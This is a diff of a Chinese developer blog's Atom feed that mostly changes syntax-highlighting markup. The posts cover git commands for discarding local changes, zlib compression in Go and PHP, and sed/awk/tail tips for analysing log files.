@@ -1,19 +1,18 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="http://jekyllrb.com" version="3.4.2">Jekyll</generator><link href="http://firsh.me/feed.xml" rel="self" type="application/atom+xml" /><link href="http://firsh.me/" rel="alternate" type="text/html" /><updated>2018-11-15T20:41:15+08:00</updated><id>http://firsh.me/</id><title type="html">张建新</title><subtitle>Flink，张建新技术博客，Kubernetes技术，虚拟化技术，微服务，容器技术,docker,Github, Google Kubernetes, kubernetes, Flink,Graphx,Spark,docker。</subtitle><author><name>unknow :)</name></author><entry><title type="html">git丢弃本地修改的所有文件（新增、删除、修改）</title><link href="http://firsh.me/2018/11/15/git-check-out-reject/" rel="alternate" type="text/html" title="git丢弃本地修改的所有文件（新增、删除、修改）" /><published>2018-11-15T17:03:19+08:00</published><updated>2018-11-15T17:03:19+08:00</updated><id>http://firsh.me/2018/11/15/git-check-out-reject</id><content type="html" xml:base="http://firsh.me/2018/11/15/git-check-out-reject/">&lt;h2 id=&quot;git丢弃本地修改的所有文件新增删除修改&quot;&gt;git丢弃本地修改的所有文件（新增、删除、修改）&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://firsh.me/feed.xml" rel="self" type="application/atom+xml" /><link href="http://firsh.me/" rel="alternate" type="text/html" /><updated>2018-11-15T21:08:38+08:00</updated><id>http://firsh.me/feed.xml</id><title type="html">张建新</title><subtitle>Flink，张建新技术博客，Kubernetes技术，虚拟化技术，微服务，容器技术,docker,Github, Google Kubernetes, kubernetes, Flink,Graphx,Spark,docker。</subtitle><author><name>unknow :)</name></author><entry><title type="html">git丢弃本地修改的所有文件（新增、删除、修改）</title><link href="http://firsh.me/2018/11/15/git-check-out-reject/" rel="alternate" type="text/html" title="git丢弃本地修改的所有文件（新增、删除、修改）" /><published>2018-11-15T17:03:19+08:00</published><updated>2018-11-15T17:03:19+08:00</updated><id>http://firsh.me/2018/11/15/git-check-out-reject</id><content type="html" xml:base="http://firsh.me/2018/11/15/git-check-out-reject/">&lt;h2 id=&quot;git丢弃本地修改的所有文件新增删除修改&quot;&gt;git丢弃本地修改的所有文件（新增、删除、修改）&lt;/h2&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git checkout . &lt;span class=&quot;c&quot;&gt;#本地所有修改的。没有的提交的，都返回到原来的状态&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git checkout &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#本地所有修改的。没有的提交的，都返回到原来的状态&lt;/span&gt;
 git stash &lt;span class=&quot;c&quot;&gt;#把所有没有提交的修改暂存到stash里面。可用git stash pop回复。&lt;/span&gt;
-git reset --hard HASH &lt;span class=&quot;c&quot;&gt;#返回到某个节点，不保留修改。&lt;/span&gt;
-git reset --soft HASH &lt;span class=&quot;c&quot;&gt;#返回到某个节点。保留修改&lt;/span&gt;
+git reset &lt;span class=&quot;nt&quot;&gt;--hard&lt;/span&gt; HASH &lt;span class=&quot;c&quot;&gt;#返回到某个节点，不保留修改。&lt;/span&gt;
+git reset &lt;span class=&quot;nt&quot;&gt;--soft&lt;/span&gt; HASH &lt;span class=&quot;c&quot;&gt;#返回到某个节点。保留修改&lt;/span&gt;
 
-git clean -df &lt;span class=&quot;c&quot;&gt;#返回到某个节点&lt;/span&gt;
+git clean &lt;span class=&quot;nt&quot;&gt;-df&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#返回到某个节点&lt;/span&gt;
 git clean &lt;span class=&quot;c&quot;&gt;#参数&lt;/span&gt;
-    -n &lt;span class=&quot;c&quot;&gt;#显示 将要 删除的 文件 和  目录&lt;/span&gt;
-    -f &lt;span class=&quot;c&quot;&gt;#删除 文件&lt;/span&gt;
-    -df &lt;span class=&quot;c&quot;&gt;#删除 文件 和 目录&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#显示 将要 删除的 文件 和  目录&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#删除 文件&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;-df&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#删除 文件 和 目录&lt;/span&gt;
 
-git checkout . &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git clean -xdf &lt;span class=&quot;c&quot;&gt;# 清除本地&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+git checkout &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git clean &lt;span class=&quot;nt&quot;&gt;-xdf&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# 清除本地&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;原文：https://blog.csdn.net/leedaning/article/details/51304690&lt;/p&gt;
 
@@ -23,7 +22,7 @@ git checkout . &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; g
 
 &lt;h3 id=&quot;golang-代码&quot;&gt;Golang 代码&lt;/h3&gt;
 
-&lt;div class=&quot;language-golang highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
+&lt;div class=&quot;language-golang highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
 
 &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
 	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bytes&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
@@ -80,12 +79,11 @@ git checkout . &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; g
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abc&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;120&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;156&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;76&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eJxKTEoGBAAA&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;//8CTQEn&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;php-代码&quot;&gt;PHP 代码&lt;/h3&gt;
 
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
 
 &lt;span class=&quot;nv&quot;&gt;$code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;zlib_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;abc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ZLIB_ENCODING_DEFLATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
@@ -98,8 +96,7 @@ git checkout . &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; g
 &lt;span class=&quot;c1&quot;&gt;// 654a784c54456f4741414a4e4153633d
 &lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;疑问&quot;&gt;疑问&lt;/h3&gt;
 
@@ -120,7 +117,7 @@ git checkout . &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; g
   &lt;li&gt;shell demo&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 &lt;span class=&quot;nb&quot;&gt;set time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 12:34:56
 &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;hr &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$time&lt;/span&gt; | awk &lt;span class=&quot;s1&quot;&gt;'{split($0,a,&quot;:&quot; ); print a[1]}'&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# = 12&lt;/span&gt;
 
@@ -129,74 +126,71 @@ git checkout . &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; g
 &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;hms &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$time&lt;/span&gt; | awk &lt;span class=&quot;s1&quot;&gt;'{split($0,a,&quot;:&quot; ); print a[1], a[2], a[3]}'&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# = 12 34 56&lt;/span&gt;
 
 &lt;span class=&quot;c&quot;&gt;# 获得5 - 10 line 并且用 `;` 分隔每一行  获得第个元素&lt;/span&gt;
-sed -n &lt;span class=&quot;s1&quot;&gt;'5,10p'&lt;/span&gt; xvideos.com-db.csv | awk &lt;span class=&quot;s1&quot;&gt;'{split($0,a,&quot;;&quot; ); print a[1]}'&lt;/span&gt;
+sed &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'5,10p'&lt;/span&gt; xvideos.com-db.csv | awk &lt;span class=&quot;s1&quot;&gt;'{split($0,a,&quot;;&quot; ); print a[1]}'&lt;/span&gt;
 
-sed -n &lt;span class=&quot;s1&quot;&gt;'5,10p'&lt;/span&gt; xvideos.com-db.csv | awk &lt;span class=&quot;s1&quot;&gt;'{split($0,a,&quot;;&quot; ); print a[1] a[2]}'&lt;/span&gt;
+sed &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'5,10p'&lt;/span&gt; xvideos.com-db.csv | awk &lt;span class=&quot;s1&quot;&gt;'{split($0,a,&quot;;&quot; ); print a[1] a[2]}'&lt;/span&gt;
 
 &lt;span class=&quot;c&quot;&gt;#从第3000行开始，显示1000行。即显示3000~3999行&lt;/span&gt;
-cat filename | tail -n +3000 | head -n 1000
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;filename | tail &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; +3000 | head &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1000
 
 &lt;span class=&quot;c&quot;&gt;#显示1000行到3000行&lt;/span&gt;
 
-cat filename| head -n 3000 | tail -n +1000 
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;filename| head &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 3000 | tail &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; +1000 
 
-tail -n 1000 &lt;span class=&quot;c&quot;&gt;#：显示最后1000行&lt;/span&gt;
+tail &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1000 &lt;span class=&quot;c&quot;&gt;#：显示最后1000行&lt;/span&gt;
 
-tail -n +1000 &lt;span class=&quot;c&quot;&gt;#：从1000行开始显示，显示1000行以后的&lt;/span&gt;
+tail &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; +1000 &lt;span class=&quot;c&quot;&gt;#：从1000行开始显示，显示1000行以后的&lt;/span&gt;
 
-head -n 1000 &lt;span class=&quot;c&quot;&gt;#：显示前面1000行&lt;/span&gt;
+head &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1000 &lt;span class=&quot;c&quot;&gt;#：显示前面1000行&lt;/span&gt;
 
-tail -400f demo.log &lt;span class=&quot;c&quot;&gt;#监控最后400行日志文件的变化 等价与 tail -n 400 -f （-f参数是实时）&lt;/span&gt;
+tail &lt;span class=&quot;nt&quot;&gt;-400f&lt;/span&gt; demo.log &lt;span class=&quot;c&quot;&gt;#监控最后400行日志文件的变化 等价与 tail -n 400 -f （-f参数是实时）&lt;/span&gt;
 
 less demo.log &lt;span class=&quot;c&quot;&gt;#查看日志文件，支持上下滚屏，查找功能&lt;/span&gt;
 
-uniq -c demo.log  &lt;span class=&quot;c&quot;&gt;#标记该行重复的数量，不重复值为1&lt;/span&gt;
+uniq &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; demo.log  &lt;span class=&quot;c&quot;&gt;#标记该行重复的数量，不重复值为1&lt;/span&gt;
 
-grep &lt;span class=&quot;s1&quot;&gt;'INFO'&lt;/span&gt; demo.log     &lt;span class=&quot;c&quot;&gt;#在文件demo.log中查找所有包行INFO的行&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'INFO'&lt;/span&gt; demo.log     &lt;span class=&quot;c&quot;&gt;#在文件demo.log中查找所有包行INFO的行&lt;/span&gt;
 
-grep -o &lt;span class=&quot;s1&quot;&gt;'order-fix.curr_id:\([0-9]\+\)'&lt;/span&gt; demo.log    &lt;span class=&quot;c&quot;&gt;#-o选项只提取order-fix.curr_id:xxx的内容（而不是一整行），并输出到屏幕上&lt;/span&gt;
-grep -c &lt;span class=&quot;s1&quot;&gt;'ERROR'&lt;/span&gt; demo.log   &lt;span class=&quot;c&quot;&gt;#输出文件demo.log中查找所有包行ERROR的行的数量&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'order-fix.curr_id:\([0-9]\+\)'&lt;/span&gt; demo.log    &lt;span class=&quot;c&quot;&gt;#-o选项只提取order-fix.curr_id:xxx的内容（而不是一整行），并输出到屏幕上&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ERROR'&lt;/span&gt; demo.log   &lt;span class=&quot;c&quot;&gt;#输出文件demo.log中查找所有包行ERROR的行的数量&lt;/span&gt;
 
 &lt;span class=&quot;c&quot;&gt;# 输出demo.log中的某个日期中的ERROR的行&lt;/span&gt;
-sed -n &lt;span class=&quot;s1&quot;&gt;'/^2011-08-23.*ERROR/p'&lt;/span&gt; demolog.log
+sed &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/^2011-08-23.*ERROR/p'&lt;/span&gt; demolog.log
 
 &lt;span class=&quot;c&quot;&gt;#指定执行的sed文件&lt;/span&gt;
-sed -f demo.sed2 demo.log
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+sed &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; demo.sed2 demo.log
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;ul&gt;
   &lt;li&gt;demo.sed2&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#n   #这一行用法和命令中的-n一样意思，就是默认不输出&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#n   #这一行用法和命令中的-n一样意思，就是默认不输出&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;#demo.sed2&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;#下面的一行是替换指令，就是把19位长的日期和INFO/ERROR,id,和后面的一截提取出来，然后用@分割符把这4个字段重新按顺序组合&lt;/span&gt;
 s/^&lt;span class=&quot;se&quot;&gt;\(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt; 0-9]&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;19&lt;span class=&quot;se&quot;&gt;\}\)&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\(&lt;/span&gt;INFO&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;ERROR&lt;span class=&quot;se&quot;&gt;\)&lt;/span&gt; .&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;order-fix.curr_id:&lt;span class=&quot;se&quot;&gt;\(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0-9]&lt;span class=&quot;se&quot;&gt;\+\)&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\(&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;/&lt;span class=&quot;se&quot;&gt;\1&lt;/span&gt;@&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;@&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;@&lt;span class=&quot;se&quot;&gt;\4&lt;/span&gt;/p
 
 
 &lt;span class=&quot;c&quot;&gt;#排序功能 -t表示用@作为分割符，-k表示用分割出来的第几个域排序(不要漏掉后面的,2/,3/,1，详细意思看下面的参考链接，这里不做详述)&lt;/span&gt;
-sed -f test.sed demolog.log | sort -t@ -k2,2n -k3,3r -k1,1  &lt;span class=&quot;c&quot;&gt;#n为按数字排序，r为倒序&lt;/span&gt;
+sed &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; test.sed demolog.log | sort &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;@ &lt;span class=&quot;nt&quot;&gt;-k2&lt;/span&gt;,2n &lt;span class=&quot;nt&quot;&gt;-k3&lt;/span&gt;,3r &lt;span class=&quot;nt&quot;&gt;-k1&lt;/span&gt;,1  &lt;span class=&quot;c&quot;&gt;#n为按数字排序，r为倒序&lt;/span&gt;
 
 
 awk &lt;span class=&quot;s1&quot;&gt;'BEGIN{FS=&quot;@&quot;} {print $2,$3}'&lt;/span&gt; demo.log_after_sort   &lt;span class=&quot;c&quot;&gt;#BEGIN中预处理的是，把@号作为行的列分割符,把分割后的行的第2，3列输出&lt;/span&gt;
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;ul&gt;
   &lt;li&gt;对指定时间范围内的日志进行统计，包括输出INFO，ERROR总数，记录总数，每个订单记录分类统计&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sed -f demo.sed demolog.log | sort -t@ -k2,2n -k3,3r -k1,1 | awk -f demo.awk
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sed &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; demo.sed demolog.log | sort &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;@ &lt;span class=&quot;nt&quot;&gt;-k2&lt;/span&gt;,2n &lt;span class=&quot;nt&quot;&gt;-k3&lt;/span&gt;,3r &lt;span class=&quot;nt&quot;&gt;-k1&lt;/span&gt;,1 | awk &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; demo.awk
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;ul&gt;
   &lt;li&gt;demo.awk&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#下面的例子是作为命令行输入的，利用单引号作为换行标记，这样就不用另外把脚本写进文件调用了&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#下面的例子是作为命令行输入的，利用单引号作为换行标记，这样就不用另外把脚本写进文件调用了&lt;/span&gt;
 awk &lt;span class=&quot;s1&quot;&gt;'
 BEGIN {
 FS=&quot;@&quot;
@@ -213,19 +207,17 @@ print &quot;order total count:&quot;NR           #NR是awk内置变量，是遍�
 printf(&quot;INFO count:%d ERROR count:%d\n&quot;,info_count,error_count)
 } '&lt;/span&gt; demo.log_after_sort
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ll -lrth &lt;span class=&quot;c&quot;&gt;#:按照更改时间倒序排列，最新文件在下边&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ll &lt;span class=&quot;nt&quot;&gt;-lrth&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#:按照更改时间倒序排列，最新文件在下边&lt;/span&gt;
 
-ll -lrSh &lt;span class=&quot;c&quot;&gt;#:按照文件大小倒序排列，最大文件在下边&lt;/span&gt;
-grep --color &lt;span class=&quot;c&quot;&gt;# :高亮查询关键字&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+ll &lt;span class=&quot;nt&quot;&gt;-lrSh&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#:按照文件大小倒序排列，最大文件在下边&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--color&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# :高亮查询关键字&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;ul&gt;
   &lt;li&gt;在大多数情况下&lt;code class=&quot;highlighter-rouge&quot;&gt; awk&lt;/code&gt; 的 &lt;code class=&quot;highlighter-rouge&quot;&gt;print&lt;/code&gt; 语句可以完成任务，但有时我们还需要更多。在那些情况下，awk 提供了两个我们熟知的函数 &lt;code class=&quot;highlighter-rouge&quot;&gt;printf()&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;sprintf()&lt;/code&gt;。是的，如同其它许多 awk 部件一样，这些函数等同于相应的&lt;code class=&quot;highlighter-rouge&quot;&gt; C 语言函数&lt;/code&gt;。&lt;code class=&quot;highlighter-rouge&quot;&gt;printf()&lt;/code&gt; 会将格式化字符串打印到 stdout，而 sprintf()函数返回根据&lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt;格式说明指定的格式化的字符串，它格式化数据但不输出数据。a w k提供函数&lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt;，拥有几种不同的格式化输出功能。例如按列输出、左对齐或右对齐方式。&lt;/li&gt;
   &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;printf()&lt;/code&gt;函数基本语法是&lt;code class=&quot;highlighter-rouge&quot;&gt;printf()&lt;/code&gt;（&lt;code class=&quot;highlighter-rouge&quot;&gt;格式控制符&lt;/code&gt;，&lt;code class=&quot;highlighter-rouge&quot;&gt;参数&lt;/code&gt;） ，格式控制字符通常在引号里。类似C语言，awk printf格式有如下：
-    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//ASCII字符
+    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//ASCII字符
 &lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//整数
 &lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//浮点数，科学记数法
 &lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//浮点数，例如（1 2 3 . 4 4）
@@ -233,57 +225,52 @@ grep --color &lt;span class=&quot;c&quot;&gt;# :高亮查询关键字&lt;/span&g
 &lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//八进制数
 &lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//字符串
